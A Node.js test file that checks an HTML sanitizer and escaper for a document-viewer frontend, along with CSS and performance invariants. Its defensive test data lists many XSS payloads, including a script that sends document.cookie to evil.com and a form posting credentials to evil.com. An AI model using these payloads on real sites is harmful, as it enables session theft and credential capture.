import test from 'node:test';
import assert from 'node:assert/strict';
import fs from 'node:fs';
import path from 'node:path';
import { fileURLToPath } from 'node:url';
import { sanitizeHtml, escapeHtml, isSafeUrl } from '../lib/security/sanitizer';

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);
const FRONTEND_ROOT = path.resolve(__dirname, '..');

test('⚔️ EMPIRICAL CHALLENGER 2: Milestone 1 Adversarial & Multi-Studio Parity Suite', async (t) => {

  // ==========================================================================
  // SECTION 1: VECTOR 4 SECURITY REGEX & CODE AUDIT IN WordArtifactViewer.tsx
  // ==========================================================================
  await t.test('Vector 4.1: WordArtifactViewer.tsx Security Invariant Regex Verifications', () => {
    const wordViewerPath = path.resolve(FRONTEND_ROOT, 'components/ai-data-analytic/office-word/WordArtifactViewer.tsx');
    assert.ok(fs.existsSync(wordViewerPath), 'WordArtifactViewer.tsx must exist');
    const content = fs.readFileSync(wordViewerPath, 'utf8');

    // Invariant 1: Mammoth result?.value is sanitized
    const regex1 = /const\s+sanitized\s*=\s*sanitizeHtml\(result\?\.value\s*\|\|\s*''\)/;
    assert.match(
      content,
      regex1,
      "WordArtifactViewer must contain exact invariant: const sanitized = sanitizeHtml(result?.value || '')"
    );

    // Invariant 2: dangerouslySetInnerHTML is protected with sanitizeHtml(htmlContent)
    const regex2 = /dangerouslySetInnerHTML=\{\{\s*__html:\s*sanitizeHtml\(htmlContent\)\s*\}\}/;
    assert.match(
      content,
      regex2,
      "WordArtifactViewer must contain exact invariant: dangerouslySetInnerHTML={{ __html: sanitizeHtml(htmlContent) }}"
    );

    // Invariant 3: Print handler escapes report title
    const regex3 = /const\s+safeTitle\s*=\s*escapeHtml\(reportTitle\)/;
    assert.match(
      content,
      regex3,
      "WordArtifactViewer must contain exact invariant: const safeTitle = escapeHtml(reportTitle)"
    );

    // Invariant 4: Print handler bodyHtml is sanitized
    const regex4 = /bodyHtml\s*=\s*sanitizeHtml\(bodyHtml\)/;
    assert.match(
      content,
      regex4,
      "WordArtifactViewer must contain exact invariant: bodyHtml = sanitizeHtml(bodyHtml)"
    );

    // Invariant 5: Import security functions
    assert.match(
      content,
      /import\s*\{[^}]*sanitizeHtml[^}]*\}\s*from\s*['"]@\/lib\/security\/sanitizer['"]/,
      'WordArtifactViewer must import sanitizeHtml from sanitizer'
    );
    assert.match(
      content,
      /import\s*\{[^}]*escapeHtml[^}]*\}\s*from\s*['"]@\/lib\/security\/sanitizer['"]/,
      'WordArtifactViewer must import escapeHtml from sanitizer'
    );
  });

  // ==========================================================================
  // SECTION 2: EMPIRICAL XSS PAYLOAD ATTACKS ON sanitizeHtml
  // ==========================================================================
  await t.test('Vector 4.2: Empirical Adversarial XSS & Injection Attacks on sanitizeHtml', () => {
    const maliciousPayloads = [
      '<script>alert("xss-1")</script>',
      '<script src="https://evil.com/xss.js"></script>',
      '<sCrIpT>alert("xss-case")</ScRiPt>',
      '<<SCRIPT>alert("xss-nested");//<</SCRIPT>',
      '<img src="missing.png" onerror="alert(\'img-xss\')"/>',
      '<svg onload="alert(\'svg-xss\')"><circle cx="50" cy="50" r="40"/></svg>',
      '<body onload="alert(\'body-xss\')">',
      '<iframe src="javascript:alert(\'iframe-xss\')"></iframe>',
      '<iframe src="https://phishing.evil.com"></iframe>',
      '<a href="javascript:alert(\'a-xss\')">Click here</a>',
      '<a href="vbscript:msgbox(\'vbs\')">VBS link</a>',
      '<a href="data:text/html,<script>alert(\'data-xss\')</script>">Data link</a>',
      '<object data="javascript:alert(\'obj-xss\')"></object>',
      '<embed src="javascript:alert(\'embed-xss\')"></embed>',
      '<style>body { background: url("javascript:alert(\'style-xss\')"); }</style>',
      '<input type="button" onclick="alert(\'button-xss\')" value="Click">',
      '<button onmouseover="alert(\'hover-xss\')">Dangerous Button</button>',
      '<link rel="stylesheet" href="http://evil.com/evil.css">',
      '<meta http-equiv="refresh" content="0;url=javascript:alert(1)">',
      '<form action="http://evil.com/steal"><input name="cred"></form>',
      '<math><mtext><mglyph src="xxx" onerror="alert(\'math-xss\')"></mglyph></mtext></math>',
    ];

    for (const payload of maliciousPayloads) {
      const sanitized = sanitizeHtml(payload);
      assert.doesNotMatch(sanitized, /<script\b/i, `Payload must not contain script tags: ${payload}`);
      assert.doesNotMatch(sanitized, /\bon[a-z]+\s*=/i, `Payload must not contain event handlers: ${payload}`);
      assert.doesNotMatch(sanitized, /javascript:/i, `Payload must not retain javascript: scheme: ${payload}`);
      assert.doesNotMatch(sanitized, /vbscript:/i, `Payload must not retain vbscript: scheme: ${payload}`);
      assert.doesNotMatch(sanitized, /<iframe\b/i, `Payload must not contain iframe: ${payload}`);
      assert.doesNotMatch(sanitized, /<object\b/i, `Payload must not contain object: ${payload}`);
      assert.doesNotMatch(sanitized, /<embed\b/i, `Payload must not contain embed: ${payload}`);
      assert.doesNotMatch(sanitized, /<style\b/i, `Payload must not contain raw style tags: ${payload}`);
      assert.doesNotMatch(sanitized, /<form\b/i, `Payload must not contain form: ${payload}`);
    }

    // Ensure valid HTML formatting is preserved
    const benignHtml = `
      <div class="legal-doc">
        <h1>Hợp đồng mẫu</h1>
        <p>Điều khoản số 1: <strong>Thời hạn hợp đồng</strong> là 12 tháng.</p>
        <ul>
          <li>Mục A: Giá thuê 50.000.000 VNĐ</li>
          <li>Mục B: Đặt cọc 3 tháng</li>
        </ul>
      </div>
    `;
    const cleanBenign = sanitizeHtml(benignHtml);
    assert.match(cleanBenign, /<h1>Hợp đồng mẫu<\/h1>/);
    assert.match(cleanBenign, /<strong>Thời hạn hợp đồng<\/strong>/);
    assert.match(cleanBenign, /<li>Mục A: Giá thuê 50\.000\.000 VNĐ<\/li>/);
  });

  // ==========================================================================
  // SECTION 3: EMPIRICAL ATTACKS ON escapeHtml
  // ==========================================================================
  await t.test('Vector 4.3: Empirical Adversarial Attacks on escapeHtml', () => {
    const titleAttacks = [
      { input: '<script>alert("title-xss")</script>', expectedNot: '<script>' },
      { input: 'Report "><img src=x onerror=alert(1)>', expectedNot: '<img' },
      { input: 'Title & "Double" \'Single\' <Less> >Greater<', expectedNot: '<' },
      { input: '"><script src="//evil.com/x"></script>', expectedNot: '<script' },
      { input: `Normal Title with Vietnamese: Báo cáo tài chính quý 3/2026`, expectedNot: '' },
    ];

    for (const { input, expectedNot } of titleAttacks) {
      const escaped = escapeHtml(input);
      if (expectedNot) {
        assert.equal(escaped.includes(expectedNot), false, `Escaped title must not contain ${expectedNot}`);
      }
      assert.equal(escaped.includes('<'), false, 'Escaped output must not contain unescaped <');
      assert.equal(escaped.includes('>'), false, 'Escaped output must not contain unescaped >');
      assert.equal(escaped.includes('"'), false, 'Escaped output must not contain unescaped "');
      assert.equal(escaped.includes("'"), false, "Escaped output must not contain unescaped '");
    }

    // Boundary edge cases
    assert.equal(escapeHtml(''), '');
    assert.equal(escapeHtml(null), '');
    assert.equal(escapeHtml(undefined), '');
  });

  // ==========================================================================
  // SECTION 4: MAMMOTH DOCX SIMULATION & PRINT TEMPLATE BREAKOUT TEST
  // ==========================================================================
  await t.test('Vector 4.4: Mammoth Conversion Dirty Output & Print Breakout Simulation', () => {
    // Simulated dirty Mammoth output with table and malicious injection
    const dirtyMammothOutput = `
      <table class="docx-table">
        <tr><th>Chỉ số</th><th>Giá trị</th></tr>
        <tr><td>Doanh thu</td><td>120 tỷ <script>fetch('http://evil.com/leak?c='+document.cookie)</script></td></tr>
        <tr><td>Lợi nhuận</td><td><img src="chart.png" onerror="alert('table-xss')"/>25 tỷ</td></tr>
        <tr><td>Tài liệu đính kèm</td><td><a href="javascript:alert('steal')">Chi tiết</a></td></tr>
      </table>
    `;

    const sanitizedMammoth = sanitizeHtml(dirtyMammothOutput);
    assert.doesNotMatch(sanitizedMammoth, /<script\b/i);
    assert.doesNotMatch(sanitizedMammoth, /onerror=/i);
    assert.doesNotMatch(sanitizedMammoth, /javascript:/i);
    assert.match(sanitizedMammoth, /<table/);
    assert.match(sanitizedMammoth, /Doanh thu/);
    assert.match(sanitizedMammoth, /120 tỷ/);

    // Simulate Print Template generation logic verbatim from WordArtifactViewer.tsx
    const reportTitle = 'Báo cáo "><script>alert("print-title-xss")</script>';
    const safeTitle = escapeHtml(reportTitle);
    assert.doesNotMatch(safeTitle, /<script>/);
    assert.ok(safeTitle.includes('&lt;script&gt;'));

    let bodyHtml = dirtyMammothOutput;
    bodyHtml = sanitizeHtml(bodyHtml);
    assert.doesNotMatch(bodyHtml, /<script\b/i);

    const fullPrintHtml = `
      <!DOCTYPE html>
      <html>
        <head>
          <title>${safeTitle}</title>
        </head>
        <body>
          <div class="header"><h1>${safeTitle}</h1></div>
          <div class="content">${bodyHtml}</div>
        </body>
      </html>
    `;

    // Ensure entire print template is free of unescaped active script payloads
    assert.doesNotMatch(fullPrintHtml, /<script\b[^>]*>.*<\/script>/is);
    assert.doesNotMatch(fullPrintHtml, /onerror=/i);
    assert.doesNotMatch(fullPrintHtml, /javascript:/i);
  });

  // ==========================================================================
  // SECTION 5: CUCCU LEGAL TYPOGRAPHY TRIAD & ZERO-SCALE CANVAS DPI
  // ==========================================================================
  await t.test('Vector 4.5: Cuccu Legal Typography Triad & High-Clarity Canvas DPI', () => {
    const cssPath = path.resolve(FRONTEND_ROOT, 'components/ai-data-analytic/office-word/styles/word-viewer.css');
    assert.ok(fs.existsSync(cssPath), 'word-viewer.css must exist');
    const cssContent = fs.readFileSync(cssPath, 'utf8');

    // 1. Typography Triad Check
    assert.match(cssContent, /Instrument Sans/, 'CSS must include Instrument Sans for UI controls');
    assert.match(cssContent, /Lora/, 'CSS must include Lora for editorial and reasoning layers');
    assert.match(cssContent, /Times New Roman/, 'CSS must include Times New Roman for official A4 legal prose');

    // 2. High-Clarity Canvas DPI (Zero-Scale Blur)
    assert.match(cssContent, /\.ow-wd-page\s*\{[^}]*width:\s*794px/, 'ow-wd-page must be 794px width');
    assert.match(cssContent, /\.ow-wd-page\s*\{[^}]*min-width:\s*794px/, 'ow-wd-page must be min-width 794px');
    assert.match(cssContent, /\.ow-wd-page\s*\{[^}]*max-width:\s*794px/, 'ow-wd-page must be max-width 794px');
    assert.doesNotMatch(
      cssContent,
      /\.ow-wd-page\s*\{[^}]*transform:\s*scale\(/,
      'ow-wd-page must NOT have transform: scale() blur'
    );

    // 3. Safe Centered Canvas Scroll
    assert.match(cssContent, /justify-content:\s*safe\s+center/, 'Canvas must enforce justify-content: safe center');

    // 4. Color Palette & Contrast Tokens
    assert.match(cssContent, /#201f1d|#011627/, 'Must define Deep Ink text color');
    assert.match(cssContent, /#f4f3f1/, 'Must define Paper Shelf ground color');
    assert.match(cssContent, /#7d5411/, 'Must define Amber accent color');
  });

  // ==========================================================================
  // SECTION 6: ZERO REGRESSIONS ACROSS ALL 4 STUDIOS
  // ==========================================================================
  await t.test('Vector 4.6: Multi-Studio Parity & Invariant Verification Across 4 Studios', () => {
    // Studio 1: Word A4
    const wordViewer = path.resolve(FRONTEND_ROOT, 'components/ai-data-analytic/office-word/WordArtifactViewer.tsx');
    assert.ok(fs.existsSync(wordViewer), 'WordArtifactViewer.tsx must exist');
    const wordSrc = fs.readFileSync(wordViewer, 'utf8');
    assert.match(wordSrc, /export\s+default\s+WordArtifactViewer|export\s+function\s+WordArtifactViewer/);

    // Studio 2: Excel XLSX Hairline Grid
    const excelViewer = path.resolve(FRONTEND_ROOT, 'components/ai-data-analytic/office-excel/ExcelArtifactViewer.tsx');
    assert.ok(fs.existsSync(excelViewer), 'ExcelArtifactViewer.tsx must exist');
    const excelSrc = fs.readFileSync(excelViewer, 'utf8');
    assert.match(excelSrc, /export\s+default\s+ExcelArtifactViewer|export\s+function\s+ExcelArtifactViewer/);
    assert.match(excelSrc, /tabular-nums|tnum|font-mono/, 'Excel studio must maintain tabular numerals');

    // Studio 3: Slide 16:9 Presentation Canvas
    const slideViewer = path.resolve(FRONTEND_ROOT, 'components/ai-data-analytic/office-slides/SlideArtifactViewer.tsx');
    const slideRenderer = path.resolve(FRONTEND_ROOT, 'components/ai-data-analytic/office-slides/SlideRenderer.tsx');
    assert.ok(fs.existsSync(slideViewer), 'SlideArtifactViewer.tsx must exist');
    assert.ok(fs.existsSync(slideRenderer), 'SlideRenderer.tsx must exist');
    const slideSrc = fs.readFileSync(slideViewer, 'utf8') + '\n' + fs.readFileSync(slideRenderer, 'utf8');
    assert.match(slideSrc, /16\/9|aspect-video|16:9/, 'Slide studio must enforce 16:9 widescreen presentation ratio');

    // Studio 4: Code / SQL & Media Viewer
    const codeBlock = path.resolve(FRONTEND_ROOT, 'components/openwork/OpenWorkCodeBlock.tsx');
    const chartViewer = path.resolve(FRONTEND_ROOT, 'components/openwork/OpenWorkChartMediaViewer.tsx');
    assert.ok(fs.existsSync(codeBlock), 'OpenWorkCodeBlock.tsx must exist');
    assert.ok(fs.existsSync(chartViewer), 'OpenWorkChartMediaViewer.tsx must exist');

    // Workbench integration
    const workbench = path.resolve(FRONTEND_ROOT, 'components/openwork/OpenWorkWorkbench.tsx');
    assert.ok(fs.existsSync(workbench), 'OpenWorkWorkbench.tsx must exist');
    const workbenchSrc = fs.readFileSync(workbench, 'utf8');
    assert.match(workbenchSrc, /WordArtifactViewer/, 'Workbench must import WordArtifactViewer');
    assert.match(workbenchSrc, /ExcelArtifactViewer/, 'Workbench must import ExcelArtifactViewer');
    assert.match(workbenchSrc, /SlideArtifactViewer/, 'Workbench must import SlideArtifactViewer');
  });

  // ==========================================================================
  // SECTION 7: STRESS HARNESS — MASSIVE INPUTS & REDOS RESISTANCE
  // ==========================================================================
  await t.test('Vector 4.7: Performance Stress Harness & ReDoS Resilience', () => {
    // 1. Nested HTML ReDoS attack
    const deepNesting = '<div>'.repeat(400) + '<p>Deep content</p>' + '</div>'.repeat(400);
    const start1 = performance.now();
    const cleanDeep = sanitizeHtml(deepNesting);
    const dur1 = performance.now() - start1;
    assert.ok(cleanDeep.includes('Deep content'), 'Sanitized deep nesting correctly');
    assert.ok(dur1 < 100, `Deep nesting sanitization took ${dur1.toFixed(2)}ms (must be < 100ms)`);

    // 2. High-volume throughput test (1,000 adversarial payloads)
    const attackString = '<img src=x onerror=alert(1)><a href="javascript:alert(2)">link</a>';
    const start2 = performance.now();
    for (let i = 0; i < 1000; i++) {
      const res = sanitizeHtml(attackString);
      assert.doesNotMatch(res, /onerror/);
      assert.doesNotMatch(res, /javascript:/);
    }
    const dur2 = performance.now() - start2;
    assert.ok(dur2 < 500, `1,000 sanitizations took ${dur2.toFixed(2)}ms (must be < 500ms)`);

    // 3. Huge 500KB HTML Document
    const largeDoc = '<div class="page">' + '<p>Paragraph text with <b>bold</b> and <i>italic</i></p>'.repeat(5000) + '</div>';
    const start3 = performance.now();
    const cleanLarge = sanitizeHtml(largeDoc);
    const dur3 = performance.now() - start3;
    assert.ok(cleanLarge.length > 100000, 'Large document sanitized');
    assert.ok(dur3 < 300, `Large document sanitization took ${dur3.toFixed(2)}ms (must be < 300ms)`);
  });

});
